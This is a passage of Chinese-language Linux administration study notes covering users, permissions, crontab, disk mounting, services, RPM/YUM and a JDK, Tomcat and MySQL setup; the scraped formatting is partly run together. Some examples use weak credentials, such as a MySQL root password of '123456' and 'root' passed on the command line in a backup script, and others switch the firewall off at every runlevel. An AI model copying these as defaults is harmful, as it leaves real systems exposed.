切换用户名//高权限用户向低权限用户不需要密码exit //可以回到原来的用户 1)从权限高的用户切换到权限低的用户，不需要输入密码，反之需要。 2)当需要返回到原来用户时，使用 exit 指令 1whoami &#x2F;&#x2F;查看当前用户 用户组类似于角色，系统可以对有共性的多个用户进行统一的管理。 增加组 groupadd 组 名 删除组 groupdel 组 名 增加用户时直接加上组 useradd -g 用户组 用户名 修改用户的组 usermod -g 用户组 用户名 用户和组的相关文件/etc/passwd 文件 用户（user）的配置文件，记录用户的各种信息 每行的含义： 用户名 : 口令 : 用户标识号 : 组标识号 : 注释性描述 : 主目录 : 登录 Shell /etc/shadow 文件 口令的配置文件每行的含义： 登录名 : 加密口令 : 最后一次修改时间 : 最小时间间隔 : 最大时间间隔 : 警告时间 : 不活动时间 : 失效时间 : 标志 /etc/group 文件组(group)的配置文件，记录 Linux 包含的组的信息每行含义： 组名:口令:组标识号:组内用户列表 运行级别运行级别说明：0：关机1：单用户【找回丢失密码】2：多用户状态没有网络服务3：多用户状态有网络服务4：系统未使用保留给用户5：图形界面6：系统重启 常用运行级别是 3 和 5 ，要修改默认的运行级别可改文件 /etc/inittab 的 id:5:initdefault: 这一行中的数字 指定运行级别 init [012356] int 3 init [012356] 如何找回 root 密码进入到 单用户模式，然后修改 root 密码。因为进入单用户模式，root 不需要密码就可以登录。 开机在引导期间使用enter进入页面，按e进入选择第二行的内核kenral再按e进入，输入1告诉内核进入单用户模式，再按回车回去上一级按b启动。 启动后使用passwd root就可以重置密码了。reboot重启。 获得帮助信息manman [命令或配置文件]（功能描述：获得帮助信息） man ls help 指令help 命令 （功能描述：获得 shell 内置命令的帮助信息） help cd 文件目录类pwd 指令pwd (功能描述：显示当前工作目录的绝对路径) ls 指令ls [ 选 项] [目录或是文件] cd 指令cd .当前目录(不变) cd [参数] (功能描述：切换到指定目录) cd ~ 或者 cd ：回到自己的家目录 cd .. 回到当前目录的上一级目录 cd /root 使用绝对路径切换到 root 目录 cd ../../root 使用相对路径到/root 目录 mkdir 指令mkdir 指令用于创建目录(make directory) mkdir [选项] 要创建的目录 -p ：创建多级目录 1mkdir -p &#x2F;aaa&#x2F;bbb&#x2F;ccc rmdir 指令rmdir 指令删除空目录 rmdir [选项] 要删除的空目录 rmdir删除的是空目录，如果目录下有内容时无法删除的。提示：如果需要删除非空目录，需要使用rm -rf要删除的目录 touch 指令touch 指令创建空文件 touch 文件名称 cp 指令[*]cp 指令拷贝文件到指定目录 cp [选项] source dest -r ：递归复制整个文件夹 cp -r 源目录 目标目录 rm 指令rm 指令移除【删除】文件或目录 rm [选项] 要删除的文件或目录 -r ：递归删除整个文件夹 -f ： 强制删除不提示 mv 指令mv 移动文件与目录或重命名 mv oldNameFile newNameFile (功能描述：重命名) mv /temp/movefile /targetFolder (功能描述：移动文件) cat 指令cat 查看文件内容，是以只读的方式打开。 cat [选项] 要查看的文件 -n ：显示行号 cat 只能浏览文件，而不能修改文件，为了浏览方便，一般会带上 管道命令 | more cat 文件名 | more [分页浏览] more 指令more 指令是一个基于 VI 编辑器的文本过滤器，它以全屏幕的方式按页显示文本文件的内容 快捷键： less 指令less 指令用来分屏查看文件内容，它的功能与 more 指令类似，但是比 more 指令更加强大，支持各种显示终端。less 指令在显示文件内容时，并不是一次将整个文件加载之后才显示，而是根据显示需要加载内容，对于显示大型文件具有较高的效率。 1less 要查看的文件 &gt; 指令 和 &gt;&gt; 指令> 输出重定向 : 会将原来的文件的内容覆盖 >&gt; 追加： 不会覆盖原来文件的内容，而是追加到文件的尾部。 1234ls -l &gt;文件 （功能描述：列表的内容写入文件 a.txt 中（覆盖写））ls -al &gt;&gt;文件 （功能描述：列表的内容追加到文件 aa.txt 的末尾）cat 文件 1 &gt; 文件 2 （功能描述：将文件 1 的内容覆盖到文件 2）cal &gt;&gt; &#x2F;home&#x2F;mycal 将当前日历信息 追加到 &#x2F;home&#x2F;mycal 文件中 [提示 cal ] echo 指令echo 输出内容到控制台。 echo [选项] [输出内容] 1echo $PATH 使用 echo 指令输出环境变量,输出当前的环境路径。 head 指令head 用于显示文件的开头部分内容，默认情况下 head 指令显示文件的前 10 行内容 12head 文件 (功能描述：查看文件头 10 行内容)head -n 5 文件 (功能描述：查看文件头 5 行内容，5 可以是任意行数) tail 指令tail 用于输出文件中尾部的内容，默认情况下 tail 指令显示文件的后 10 行内容。 123tail 文件 （功能描述：查看文件后 10 行内容）tail -n 5 文件 （功能描述：查看文件后 5 行内容，5 可以是任意行数）tail -f 文件 （功能描述：实时追踪该文档的所有更新，工作经常使用） ln 指令软链接也叫符号链接，类似于 windows 里的快捷方式，主要存放了链接其他文件的路径 12345ln -s [原文件或目录] [软链接名] （功能描述：给原文件创建一个软链接）ln -s &#x2F;root linkToRoot 在&#x2F;home 目录下创建一个软连接 linkToRoot，连接到 &#x2F;root 目录rm -rf linkToRoot 删除软连接ln 硬链接 ##软链接可以跨文件系统，硬链接不可以；软链接可以对一个不存在的文件名（filename）进行链接（当然此时如果你vi这个软链接文件，linux会自动新建一个文件名为filename的文件），硬链接不可以（其文件必须存在，inode必须存在）；软链接可以对目录进行连接，硬链接不可以。两种链接都可以通过命令 ln 来创建。ln 默认创建的是硬链接。使用 -s 开关可以创建软链接。 当我们使用 pwd 指令查看目录时，仍然看到的是软链接所在目录。 history 指令查看已经执行过历史命令,也可以执行历史指令 123history （功能描述：查看已经执行过历史命令）history 10 显示最近使用过的 10 个指令。!10 执行编号为10的指令 时间日期类date 指令-显示当前日期123451) date （功能描述：显示当前时间）2) date +%Y （功能描述：显示当前年份）3) date +%m （功能描述：显示当前月份）4) date +%d （功能描述：显示当前是哪一天）5) date &quot;+%Y-%m-%d %H:%M:%S&quot;（功能描述：显示年月日时分秒） date 指令-设置日期1234date -s 字符串时间设置系统当前时间 ， 比如设置成 2018-10-10 11:22:22date -s &quot;2018-10-10 11:22:22&quot; 查看日历指令123cal [选项] （功能描述：不加选项，显示本月日历）calcal 2021 搜索查找类find 指令find 指令将从指定目录向下递归地遍历其各个子目录，将满足条件的文件或者目录显示在终端 find [搜索范围] [选项] 123456789101112按文件名：根据名称查找&#x2F;home 目录下的 hello.txt 文件find &#x2F;home -name hello.txt按拥有者：查找&#x2F;opt 目录下，用户名称为 nobody 的文件find &#x2F;opt -user nobody查找整个 linux 系统下大于 20m 的文件（+n 大于 -n 小于 n 等于）find &#x2F; -size +20Mfind &#x2F; -size +20480K查询 &#x2F; 目录下，所有 .txt 的文件find &#x2F; -name *.txt locate 指令locaate 指令可以快速定位文件路径。locate 指令利用事先建立的系统中所有文件名称及路径的locate 数据库实现快速定位给定的文件。Locate 指令无需遍历整个文件系统，查询速度较快。为了保证查询结果的准确度，管理员必须定期更新 locate 时刻。 12updatedb locate 搜索文件 由于 locate 指令基于数据库进行查询，所以第一次运行前，必须使用 updatedb 指令创建 locate 数据库。 grep 指令和 管道符号 |grep 过滤查找 ， 管道符，“|”，表示将前一个命令的处理结果输出传递给后面的命令处理。 1grep [选项] 查找内容 源文件 -n 显示匹配行及行号 -i 忽略字母大小写 12请在 hello.txt 文件中，查找 &quot;yes&quot; 所在行，并且显示行号cat hello.txt | grep -n yes 压缩和解压类gzip/gunzip 指令gzip 用于压缩文件， gunzip 用于解压的 gzip 文件 （功能描述：压缩文件，只能将文件压缩为*.gz 文件） gunzip 文 件.gz （功能描述：解压缩文件命令） 12345gzip 压缩， 将 &#x2F;home 下的 hello.txt 文件进行压缩gzip hello.txtgunzip 压缩， 将 &#x2F;home 下的 hello.txt.gz 文件进行解压缩gunzip hello.txt.gz 当我们使用 gzip 对文件进行压缩后，不会保留原来的文件。 zip/unzip 指令zip 用于压缩文件， unzip 用于解压的，这个在项目打包发布中很有用的 12zip [选项] XXX.zip 将要压缩的内容（功能描述：压缩文件和目录的命令）unzip [选项] XXX.zip （功能描述：解压缩文件） zip -r：递归压缩，即压缩目录 unzip -d&lt;目录&gt; ：指定解压后文件的存放目录 12345将 /home 下的 所有文件进行压缩成 mypackage.zipzip -r mypackage.zip /home/将 mypackge.zip 解压到 /opt/tmp 目录下unzip -d /opt/tmp/ mypackage.zip tar 指令tar 指令 是打包指令，最后打包后的文件是 .tar.gz 的文件。 1tar [选项] XXX.tar.gz 打包的内容 (功能描述：打包目录，压缩后的文件格式.tar.gz) 123456789101112压缩多个文件，将 /home/a1.txt 和 /home/a2.txt 压缩成 a.tar.gztar -zcvf a.tar.gz a1.txt a2.txt将/home 的文件夹 压缩成 myhome.tar.gztar -zcvf myhome.tar.gz /home/将 a.tar.gz 解压到当前目录tar -zxvf a.tar.gz将 myhome.tar.gz 解压到 /opt/ 目录下#指定解压到的那个目录，事先要存在才能成功，否则会报错。tar -zxvf myhome.tar.gz -C /opt/ 组管理和权限管理Linux 组基本介绍在 linux 中的每个用户必须属于一个组，不能独立于组外。在 linux 中每个文件有所有者、所在组、其它组的概念。1) 所有者2) 所在组3) 其它组4) 改变用户所在的组 文件/目录 所有者一般为文件的创建者,谁创建了该文件，就自然的成为该文件的所有者。 查看文件的所有者指令：ls -ahl 创建一个组 police,再创建一个用户 tom,将 tom 放在 police 组 ,然后使用 tom 来创建一个文件 ok.txt 所有者👆 修改文件所有者指令：chown 用户名 文件名 使用 root 创建一个文件 apple.txt ，然后将其所有者修改成 tom 组的创建groupadd 组 名 创建一个组, ,monster 创建一个用户 fox ，并放入到 monster 组中 123groupadd monsteruseradd -g monster foxid fox &#x2F;&#x2F;查看 文件/目录 所在组当某个用户创建了一个文件后，默认这个文件的所在组就是该用户所在的组。 查看文件/目录所在组ls –ahl 修改文件所在的组chgrp 组名 文件名 使用 root 用户创建文件 orange.txt ,看看当前这个文件属于哪个组，然后将这个文件所在组，修改到 police 组 。 其它组除文件的所有者和所在组的用户外，系统的其它用户都是文件的其它组. 改变用户所在组在添加用户时，可以指定将该用户添加到哪个组中，同样的用 root 的管理权限可以改变某个用户所在的组。 12usermod –g 组名 用户名usermod –d 目录名 用户名 改变该用户 创建一个土匪组（bandit）将 tom 这个用户从原来所在的 police 组，修改到 bandit(土匪) 组 权限的基本介绍ls -l 中显示的内容如下： 1-rwxrw-r-- 1 root root 1213 Feb 2 09:39 abc 0-9 位说明 1)第 0 位确定文件类型(d, - , l , c , b) 2)第 1-3 位确定所有者（该文件的所有者）拥有该文件的权限。—-User 3)第 4-6 位确定所属组（同用户组的）拥有该文件的权限，—-Group 4)第 7-9 位确定其他用户拥有该文件的权限 —-Other rwx权限详解rwx作用到文件1) [ r ]代表可读(read): 可以读取,查看 2) [ w ]代表可写(write): 可以修改,但是不代表可以删除该文件,删除一个文件的前提条件是对该文件所在的目录有写权限，才能删除该文件. 3) [ x ]代表可执行(execute):可以被执行 rwx作用到目录1) [ r ]代表可读(read): 可以读取，ls 查看目录内容 2) [ w ]代表可写(write): 可以修改,目录内创建+删除+重命名目录 3) [ x ]代表可执行(execute):可以进入该目录 文件及目录权限实际案例ls -l 中显示的内容如下： -rwxrw-r— 1 root root 1213 Feb 2 09:39 abc 10 个字符确定不同用户能对文件干什么 第一个字符代表文件类型： 文件 (-),目录(d),链接(l)其余字符每 3 个一组(rwx) 读(r) 写(w) 执行(x)第一组 rwx : 文件拥有者的权限是读、写和执行第二组 rw- : 与文件拥有者同一组的用户的权限是读、写但不能执行 第三组 r— : 不与文件拥有者同组的其他用户的权限是读不能写和执行 可用数字表示为: r=4,w=2,x=1 因此 rwx=4+2+1=7 1 文件：硬连接数或 目录：子目录数 root 用户 root 组 1213 文件大小(字节)，如果是文件夹，显示 4096 字节 Feb 2 09:39 最后修改日期 abc 文件名 ​ 修改权限-chmod通过 chmod 指令，可以修改文件或者目录的权限 第一种方式：+ 、-、= 变更权限u:所有者 g:所有组 o:其他人 a:所有人(u、g、o 的总和) 1) chmod u=rwx,g=rx,o=x 文件目录名 2) chmod o+w 文件目录名 3) chmod a-x 文件目录名 给 abc 文件 的所有者读写执行的权限，给所在组读执行权限，给其它组读执行权限。 给 abc 文件的所有者除去执行的权限，增加组写的权限 给 abc 文件的所有用户添加读的权限 第二种方式：通过数字变更权限规则：r=4 w=2 x=1,rwx=4+2+1=7 chmod u=rwx,g=rx,o=x 文件目录名 相当于 chmod 751 文件目录名 将 /home/abc.txt 文件的权限修改成 rwxr-xr-x, 使用给数字的方式实现： rwx = 4+2+1 = 7 r-x = 4+1=5 r-x = 4+1 =5 指令：chmod 755 /home/abc.txt 修改文件所有者-chownchown newowner file 改变文件的所有者 chown newowner:newgroup file 改变用户的所有者和所有组 -R 如果是目录 则使其下所有子文件或目录递归生效 请将 /home/abc .txt 文件的所有者修改成 tom 请将 /home/kkk 目录下所有的文件和目录的所有者都修改成 tom 首选我们应该使用 root 操作。 修改文件所在组-chgrpchgrp newgroup file 改变文件的所有组 1) 请将 /home/abc .txt 文件的所在组修改成 bandit (土匪) 1chgrp bandit /home/abc.txt 2) 请将 /home/kkk 目录下所有的文件和目录的所在组都修改成 bandit(土匪) 1chgrp -R bandit &#x2F;home&#x2F;kkk 最佳实践-警察和土匪游戏police警察 bandit土匪 jack, jerry: 警 察 xh, xq: 土 匪 (1) 创建组 bash&gt; groupadd police bash&gt; groupadd bandit (2) 创建用户 (3) jack 创建一个文件，自己可以读写，本组人可以读，其它组没人任何权限 (4) jack 修改该文件，让其它组人可以读, 本组人可以读写 (5) xh 投靠 警察，看看是否可以读写. 先用 root 修改 xh 的组 ： 使用 jack 给他的家目录 /home/jack 的所在组一个 rx 的权限 xh 需要重新注销在到 jack 目录就可以操作 jack 的文件 crond 任务调度原理 crontab 进行 定时任务的设置 任务调度：是指系统在某个时间执行的特定的命令或程序。 任务调度分类： 1.系统工作：有些重要的工作必须周而复始地执行。如病毒扫描等 2.个别用户工作：个别用户可能希望执行某些程序，比如对 mysql 数据库的备份。 基本语法1crontab [选项] 要求设置任务调度文件：/etc/crontab 设置个人任务调度。执行 crontab –e 命令。 接着输入任务到调度文件 如：/1 * ls –l /etc/ &gt; /tmp/to.txt 意思说每小时的每分钟执行 ls –l /etc/ &gt; /tmp/to.txt 命令 步骤如下1) cron -e 2) / 1 * ls -l /etc &gt;&gt; /tmp/to.txt 3) 当保存退出后就程序。 4) 在每一分钟都会自动的调用 ls -l /etc &gt;&gt; /tmp/to.txt 参数细节说明 案例 1：每隔 1 分钟，就将当前的日期信息，追加到 /tmp/mydate 文件中1) 先编写一个文件 /home/mytask1.sh date &gt;&gt; /tmp/mydate 2) 给 mytask1.sh 一个可以执行权限 chmod 744 /home/mytask1.sh 3) crontab -e 4) */1 * * * * /home/mytask1.sh 5) 成功 案例 2：每隔 1 分钟， 将当前日期和日历都追加到 /home/mycal 文件中1) 先编写一个文件 /home/mytask2.sh date &gt;&gt; /tmp/mycal cal &gt;&gt; /tmp/mycal 2) 给 mytask1.sh 一个可以执行权限 chmod 744 /home/mytask2.sh 3) crontab -e 4) /1 * /home/mytask2.sh 5) 成功 案例 3: 每天凌晨 2:00 将 mysql 数据库 testdb ，备份到文件中mydb.bak。1) 先编写一个文件 /home/mytask3.sh /usr/local/mysql/bin/mysqldump -u root -proot testdb &gt; /tmp/mydb.bak 2) 给 mytask3.sh 一个可以执行权限 1chmod 744 &#x2F;home&#x2F;mytask3.sh 3) 1crontab -e 4) 10 2 * * * &#x2F;home&#x2F;mytask3.sh 5) 成功 crond 相关指令:1) conrtab –r：终止任务调度。 2) crontab –l：列出当前有那些任务调度 3) service crond restart [重启任务调度] Linux 磁盘分区、挂载分区基础知识windows 下的磁盘分区 分区的方式：1) mbr 分区: 1.最多支持四个主分区 2.系统只能安装在主分区 3.扩展分区要占一个主分区 4.MBR 最大只支持 2TB，但拥有最好的兼容性 2) gtp 分区: 1.支持无限多个主分区（但操作系统可能限制，比如 windows 下最多 128 个分区） 2.最大支持 18EB 的大容量（1EB=1024 PB，1PB=1024 TB ） 3.windows7 64 位以后支持 windows 下的磁盘分区 Linux 分区原理介绍1)Linux 来说无论有几个分区，分给哪一目录使用，它归根结底就只有一个根目录，一个独立且唯一的文件结构 , Linux 中每个分区都是用来组成整个文件系统的一部分。 2)Linux 采用了一种叫“载入”的处理方法，它的整个文件系统中包含了一整套的文件和目录， 且将一个分区和一个目录联系起来。这时要载入的一个分区将使它的存储空间在一个目录下获得。 硬盘说明1)Linux 硬盘分 IDE 硬盘和 SCSI 硬盘，目前基本上是 SCSI 硬盘 2)对于 IDE 硬盘，驱动器标识符为“hdx~”,其中“hd”表明分区所在设备的类型，这里是指 IDE 硬盘了。“x”为盘号（a 为基本盘，b 为基本从属盘，c 为辅助主盘，d 为辅助从属盘）,“~”代表分区，前四个分区用数字 1 到 4 表示，它们是主分区或扩展分区，从 5 开始就是逻辑分区。例，hda3 表示为第一个 IDE 硬盘上的第三个主分区或扩展分区,hdb2 表示为第二个 IDE 硬盘上的第二个主分区或扩展分区。 3)对于 SCSI 硬盘则标识为“sdx~”，SCSI 硬盘是用“sd”来表示分区所在设备的类型的，其余则和 IDE 硬盘的表示方法一样 . 使用 lsblk 指令查看当前系统的分区情况 挂载的经典案例需求是给我们的 Linux 系统增加一个新的硬盘，并且挂载到/home/newdisk 如何增加一块硬盘1)虚拟机添加硬盘 2)分区 fdisk /dev/sdb 3)格式化 mkfs -t ext4 /dev/sdb1 4)挂载 先创建一个 /home/newdisk , 挂 载 mount /dev/sdb1 /home/newdisk 5)设置可以自动挂载(永久挂载，当你重启系统，仍然可以挂载到 /home/newdisk) 。 vim /etc/fstab /dev/sdb1 /home/newdisk ext4 defaults 0 0 具体的操作步骤整理虚拟机增加硬盘步骤 1在【虚拟机】菜单中，选择【设置】，然后设备列表里添加硬盘，然后一路【下一步】，中间只有选择磁盘大小的地方需要修改，至到完成。然后重启系统（才能识别）！ 重启虚拟机reboot 重启后使用 lsblk -f 可以看见多了个sdb 虚拟机增加硬盘步骤 2使用分区命令 1fdisk &#x2F;dev&#x2F;sdb 开始对/sdb 分区 输入m可以看到帮助 m 显示命令列表 p 显示磁盘分区 同 fdisk –l n 新增分区 d 删除分区 w 写入并退出 12345输入n显示 e extended p primary partition(1-4)选择p 说明： 开始分区后输入 n，新增分区，然后选择 p ，分区类型为主分区。两次回车默认剩余全部空间。最后输入 w 写入分区并退出，若不保存退出输入 q。 虚拟机增加硬盘步骤 3格式化磁盘 分区命令: 1mkfs -t ext4 &#x2F;dev&#x2F;sdb1 其中 ext4 是分区类型 虚拟机增加硬盘步骤 4挂载: 将一个分区与一个目录联系起来， •mount 设备名称 挂载目录 •例如： mount /dev/sdb1 /home/newdisk •umount 设备名称 或者 挂载目录 •例如： umount /dev/sdb1 或者 umount /newdisk 虚拟机增加硬盘步骤 5vim /etc/fstab 在UUID上面一行插入 1/dev/sdb1 /home/newdisk ext4 defaults 0 0 这句话可以使开机后能自动挂载 使用命令mount -a立即生效 永久挂载通过修改实现挂载添加完成后 执行 –即刻生效 磁盘情况查询查询系统整体磁盘使用情况1df -h 查询指定目录的磁盘占用情况1du -h &#x2F;目录 查询指定目录的磁盘占用情况，默认为当前目录 123456789-s 指定目录占用大小汇总-h 带计量单位-a 含文件--max-depth&#x3D;1 子目录深度-c 列出明细的同时，增加汇总值 查询 /opt 目录的磁盘占用情况，深度为 1 磁盘情况-工作实用指令1) 统计/home 文件夹下文件的个数 1^- 表示以&quot;-&quot;打头的，表示文件 2) 统计/home 文件夹下目录的个数 3)统计计/home 文件夹下文件的个数，包括子文件夹里的 4) 统计文件夹下目录的个数，包括子文件夹里的 5)以树状显示目录结构 网络配置Linux 网络配置原理图(含虚拟机) 目前我们的网络配置采用的是 NAT。 查看网络 IP 和网关查看虚拟网络编辑器 修改 ip 地址(修改虚拟网络的 ip) 查看网关 查看 windows 环境的中 VMnet8 网络配置 (ipconfig 指令)1) 使用 ipconfig 查看 2) 界面查看 ping 测试主机之间网络连通ping 目的主机 （功能描述：测试当前服务器是否可以连接目的主机） 测试当前服务器是否可以连接百度 [root@hadoop100 桌面]# ping www.baidu.com linux 网络环境配置第一种方法(自动获取) 缺点: linux 启动后会自动获取 IP,缺点是每次自动获取的 ip 地址可能不一样。这个不适用于做服务器，因为我们的服务器的 ip 需要时固定的。 第二种方法(指定固定的 ip) 直 接 修 改 配 置 文 件 来 指 定 IP, 并 可 以 连 接 到 外 网 ( 程 序 员 推 荐 ) ， 编 辑 vi /etc/sysconfig/network-scripts/ifcfg-eth0 要求：将 ip 地址配置的静态的，ip 地址为 192.168.184.130 修改后，一定要 重启服务 1) service network restart 2) reboot 重启系统 进程管理进程的基本介绍 1)在 LINUX 中，每个执行的程序（代码）都称为一个进程。每一个进程都分配一个 ID 号。 2)每一个进程，都会对应一个父进程，而这个父进程可以复制多个子进程。例如 www 服务器。 3)每个进程都可能以两种方式存在的。前台与后台，所谓前台进程就是用户目前的屏幕上可以进行操作的。后台进程则是实际在操作，但由于屏幕上无法看到的进程，通常使用后台方式执行。 4)一般系统的服务都是以后台进程的方式存在，而且都会常驻在系统中。直到关机才才结束。 显示系统执行的进程查看进行使用的指令是 ps ,一般来说使用的参数是 ps -aux ps 指令详解1)指令：ps –aux|grep xxx ，比如我看看有没有 sshd 服务 指令说明 • System V 展示风格 • USER：用户名称 • PID：进程号 • %CPU：进程占用 CPU 的百分比 • %MEM：进程占用物理内存的百分比 • VSZ：进程占用的虚拟内存大小（单位：KB） • RSS：进程占用的物理内存大小（单位：KB） • TT：终端名称,缩写 . • STAT：进程状态，其中 S-睡眠，s-表示该进程是会话的先导进程，N-表示进程拥有比普通优先级更低的优先级，R-正在运行，D-短期等待，Z-僵死进程，T-被跟踪或者被停止等等 • STARTED：进程的启动时间 • TIME：CPU 时间，即进程使用 CPU 的总时间 • COMMAND：启动进程所用的命令和参数，如果过长会被截断显示 要求：以全格式显示当前所有的进程，查看进程的父进程。 • ps -ef 是以全格式显示当前所有的进程 • -e 显示所有进程。-f 全格式。 ​ • ps -ef|grep xxx ​ • 是 BSD 风格 ​ • UID：用户 ID ​ • PID：进程 ID ​ • PPID：父进程 ID ​ • C：CPU 用于计算执行优先级的因子。数值越大，表明进程是 CPU 密集型运算，执行优先级会降低；数值越小，表明进程是 I/O 密集型运算，执行优先级会提高 ​ • STIME：进程启动的时间 ​ • TTY：完整的终端名称 ​ • TIME：CPU 时间 ​ • CMD：启动进程所用的命令和参数 如果我们希望查看 sshd 进程的父进程号是多少，应该怎样查询 ？ 可以看到是1. 终止进程 kill 和 killall若是某个进程执行一半需要停止时，或是已消了很大的系统资源时，此时可以考虑停止该进程。使用 kill 命令来完成此项任务。 123kill [选项] 进程号（功能描述：通过进程号杀死进程）killall 进程名称（功能描述：通过进程名称杀死进程，也支持通配符，这在系统因负载过大而变得很慢时很有用） 选项: -9 :表示强迫进程立即停止 踢掉某个非法登录用户 xshell用jack登录 终止远程登录服务 sshd, 在适当时候再次重启 sshd 服务 终止多个 gedit 编辑器 【killall , 通过进程名称来终止进程】 强制杀掉一个终端 查看进程树 pstree1pstree [选项] ,可以更加直观的来看进程信息 -p :显示进程的 PID -u :显示进程的所属用户 树状的形式显示进程的 pid 树状的形式进程的用户 id pstree -u 即可。 服务(Service)管理服务(service) 本质就是进程，但是是运行在后台的，通常都会监听某个端口，等待其它程序的请求，比如(mysql , sshd 防火墙等)，因此我们又称为守护进程，是 Linux 中非常重要的知识点。 在 CentOS7.0 后 不再使用 service ,而是 systemctl service 管理指令：1service 服务名 [start | stop | restart | reload | status] 查看当前防火墙的状况，关闭防火墙和重启防火墙。 CentOS用firewalld: systemctl status firewalld 1) 关闭或者启用防火墙后，立即生效。[telnet 测试 某个端口即可] 在window下 telnet不是命令的，是因为没有telnet客户端 2)这种方式只是临时生效，当重启系统后，还是回归以前对服务的设置。 如果希望设置某个服务自启动或关闭永久生效，要使用 chkconfig 指令 查看服务名:方式 1：使用 setup -&gt; 系统服务 就可以看到。(空格选中，回车确认，tab切换) 方式 2: /etc/init.d/服务名称 服务的运行级别(runlevel):查看或者修改默认级别： 1vi &#x2F;etc&#x2F;inittab Linux 系统有 7 种运行级别(runlevel)：常用的是级别 3 和 5 • 运行级别 0：系统停机状态，系统默认运行级别不能设为 0，否则不能正常启动 • 运行级别 1：单用户工作状态，root 权限，用于系统维护，禁止远程登陆 • 运行级别 2：多用户状态(没有 NFS)，不支持网络 • 运行级别 3：完全的多用户状态(有 NFS)，登陆后进入控制台命令行模式 • 运行级别 4：系统未使用，保留 • 运行级别 5：X11 控制台，登陆后进入图形 GUI 模式 • 运行级别 6：系统正常关闭并重启，默认运行级别不能设为 6，否则不能正常启动 开机的流程说明 开机、BIOS自检、boot引导、init进程、判断运行级别、 chkconfig 指令通过 chkconfig 命令可以给每个服务的各个运行级别设置自启动/关闭 1查看服务 chkconfig --list|grep xxx chkconfig 服务名 —list chkconfig —level 5 服务名 on/off 将 sshd 服务在运行级别为 5 的情况下，不要自启动 请显示当前系统所有服务的各个运行级别的运行状态 bash&gt; chkconfig —list 查看 sshd 服务的运行状态** bash&gt; service sshd status 将 sshd 服务在运行级别 5 下设置为不自动启动，看看有什么效果？ bash&gt; chkconfig —level 5 sshd off 当运行级别为 5 时，关闭防火墙。 bash&gt; chkconfig —level 5 iptables off 在所有运行级别下，关闭防火墙 bash&gt; chkconfig iptables off 在所有运行级别下，开启防火墙 bash&gt; chkconfig iptables on 动态监控进程 top 与 ps 命令很相似。它们都用来显示正在执行的进程。Top 与 ps 最大的不同之处，在于 top 在执行一段时间可以更新正在运行的的进程。 1top [选项] 监视特定用户 top：输入此命令，按回车键，查看执行的进程。 u：然后输入“u”回车，再输入用户名，即可 终止指定的进程 top：输入此命令，按回车键，查看执行的进程。 k：然后输入“k”回车，再输入要结束的进程 ID 号 指定系统状态更新的时间(每隔 10 秒自动更新， 默认是 3 秒)： bash&gt; top -d 10 查看系统网络情况 netstat(重要)1234567netstat [选项]netstat -anp-an 按一定顺序排列输出-p 显示哪个进程在调用 查看系统所有的网络服务 查看服务名为 sshd 的服务的信息。 RPM 和 YUMrpm 包的管理 一种用于互联网下载包的打包及安装工具，它包含在某些 Linux 分发版中。它生成具有.RPM 扩展名的文件。RPM 是 RedHat Package Manager（RedHat 软件包管理工具）的缩写，类似 windows 的 setup.exe，这一文件格式名称虽然打上了 RedHat 的标志，但理念是通用的。 Linux 的分发版本都有采用（suse,redhat, centos 等等），可以算是公认的行业标准了。 rpm 包的简单查询指令查询已安装的 rpm 列表 rpm –qa|grep xx 请查询看一下，当前的 Linux 有没有安装 firefox . rpm 包名基本格式： 一个 rpm 包名：firefox-45.0.1-1.el6.centos.x86_64.rpm 名称:firefox 版本号：45.0.1-1 适用操作系统: el6.centos.x86_64 表示 centos6.x 的 64 位系统 如果是 i686i386 32 noarch rpm 包的其它查询指令： rpm -qa :查询所安装的所有 rpm 软件包 rpm -qa | more [分页显示] rpm -qa | grep X [rpm -qa | grep firefox ] rpm -q 软件包名 :查询软件包是否安装 rpm -q firefox rpm -qi 软件包名 ：查询软件包信息 rpm -qi file rpm -ql 软件包名 :查询软件包中的文件 rpm -ql firefox rpm -qf 文件全路径名 查询文件所属的软件包 rpm -qf /etc/passwd rpm -qf /root/install.log 卸载 rpm 包：1rpm -e RPM 包的名称 删除 firefox 软件包 1) 如果其它软件包依赖于您要卸载的软件包，卸载时则会产生错误信息。如： $ rpm -e foo removing these packages would break dependencies:foo is needed by bar-1.0-1 2) 如果我们就是要删除 foo 这个 rpm 包，可以增加参数 —nodeps ,就可以强制删除，但是一般不推荐这样做，因为依赖于该软件包的程序可能无法运行 如：$ rpm -e —nodeps foo 带上 —nodeps 就是强制删除。 安装 rpm 包：1rpm -ivh RPM 包全路径名称 i=install 安 装 v=verbose 提 示 h=hash 进度条 1) 演示安装 firefox 浏览器 步骤先找到 firefox 的安装 rpm 包,你需要挂载上我们安装 centos 的 iso 文件，然后到/media/下去找 rpm 找 。 1cp firefox-45.0.1-1.el6.centos.x86_64.rpm &#x2F;opt&#x2F; yum Yum 是一个 Shell 前端软件包管理器。基于 RPM 包管理，能够从指定的服务器自动下载 RPM 包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软件包。使用 yum 的前提是可以联网。 1234查询 yum 服务器是否有需要安装的软件yum list|grep xx 软件列表安装指定的 yum 包yum install xxx 下载安装 使用 yum 的方式来安装 firefox 先查看一下 firefox rpm 在 yum 服务器有没有 1) 安装 yum install firefox 搭建 JavaEE 环境 安装 JDK0) 先将软件通过 xftp5 上传到 /opt 下 1) 解压缩到 /opt 2) 配置环境变量的配置文件 vim /etc/profile JAVA_HOME=/opt/jdk1.7.0_79 PATH=/opt/jdk1.7.0_79/bin:$PATH export JAVA_HOME PATH 3)需要注销用户，环境变量才能生效 如果是在 3 运行级别， logout 如果是在 5 运行级别， 4) 在任何目录下就可以使用 java 和 javac 测试是否安装成功 ​ 编写一个简单的 输出 Hello.java 输出”hello,world!” 安装 tomcat1) 解压缩到/opt 2)启动 tomcat ./startup.sh 先进入到 tomcat 的 bin 目录 使用 Linux 本地的浏览是可以访问到 tomcat 开放端口 8080 ,这样外网才能访问到 tomcat vim /etc/sysconfig/iptables 重启防火墙 测试是否安装成功： 在 windows、Linux 下 访问 http://linuxip:8080 Eclipse 的安装1) 解压缩到/opt 2)启动 eclipse，配置 jre 和 server 启动方法 1: 创建一个快捷方式 启动方式 2: 进入到 eclipse 解压后的文件夹，然后执行 ./eclipse 即可 3)编写 jsp 页面,并测试成功! mysql 的安装和配置12rpm -ivh MYSQL-server-***.rpmrpm -ivh MYSQL-client-***.rpm 查看是否启动 1ps -ef|grep mysql 查看是否安装成功 1mysqladmin --version 启动服务 1service mysql start 连接 1mysql 改密码 1&#x2F;usr&#x2F;bin&#x2F;mysqladmin -u root password 123456 连接 1mysql -uroot -p 设置开机自启动 1chkconfig mysql on 拷贝配置文件 1cp 